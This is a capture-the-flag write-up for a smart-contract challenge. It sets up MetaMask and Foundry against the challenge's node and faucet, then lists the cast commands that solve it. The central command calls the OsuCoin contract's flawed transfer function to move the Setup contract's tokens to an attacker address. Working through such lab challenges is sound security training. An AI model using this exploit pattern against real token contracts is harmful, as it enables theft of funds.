# Note 

## Setup

### MetaMask

#### Account Creation

1. Create an account on MetaMask
2. Go to `Settings > Networks > Add a network`
3. At the bottom of the screen, choose `Add a network manually`
4. Enter any name
5. Enter the RPC URL provided in the challenge page
    > RPC endpoint: http://45.61.132.140:8545/
6. There would be an error message regarding mismatch chain ID. Use the exact chain ID mentioned in the error message (`0x5903`)
7. Enter any currency symbol
8. Save

#### Getting Address, Funds, and Private Key

1. Go to `Account details`
2. The address would be shown in blue box (hexadecimal value)
3. For private key, just click on `Show private key`
4. To get some funds, head to the provided faucet URL and paste in your account address
    > ETH Testnet Faucet: http://45.61.132.140:8080/

### Foundry

```sh
cast wallet new
```

## Solution

> [!NOTE]
> Remember to prefix the private key with `0x`

### Foundry Cast

```sh
nc 45.61.132.140 20000
# choose 1 and save the deployer account and token
cast send $DEPLOYER_ACCOUNT --rpc-url $RPC_ENDPOINT --private-key $PRIVATE_KEY --value 0.001ether
nc 45.61.132.140 20000
# choose 2 and provide back the token obtained from previous step to get the contract address
export SETUP_ADDR="<contract address>"

forge init --shallow --no-git Solve
rm -f ./Solve/src/* ./Solve/test/*
cp ./contracts/* ./Solve/src/
forge build

cast interface ./Solve/out/Setup.sol/Setup.json
cast interface ./Solve/out/OsuCoin.sol/OsuCoin.json

cast call $SETUP_ADDR --rpc-url $RPC_ENDPOINT "coin()(address)"

export COIN_ADDR="<output of previous command>"
cast call $COIN_ADDR --rpc-url $RPC_ENDPOINT "balanceOf(address)(uint128)" $SETUP_ADDR

cast send $COIN_ADDR --rpc-url $RPC_ENDPOINT --private-key $PRIVATE_KEY "transfer(address,address,uint256)(uint160)" $SETUP_ADDR $HACKER 1000000
cast call $COIN_ADDR --rpc-url $RPC_ENDPOINT "balanceOf(address)(uint128)" $SETUP_ADDR
cast call $COIN_ADDR --rpc-url $RPC_ENDPOINT "balanceOf(address)(uint128)" $HACKER

cast call $SETUP_ADDR --rpc-url $RPC_ENDPOINT "isSolved()(bool)"
nc 45.61.132.140 20000
# choose 3 and profit
```

### Foundry Forge

```sh
# on-chain simulation
forge script script/Solve.s.sol:SolveScript --rpc-url $RPC_ENDPOINT

# real
forge script script/Solve.s.sol:SolveScript --rpc-url $RPC_ENDPOINT --broadcast
```

## Useful Links

- <https://github.com/YanhuiJessica/cheb3>

## Appendix

Use `cast call` if the function is declared with `view` keyword, otherwise use `cast send`
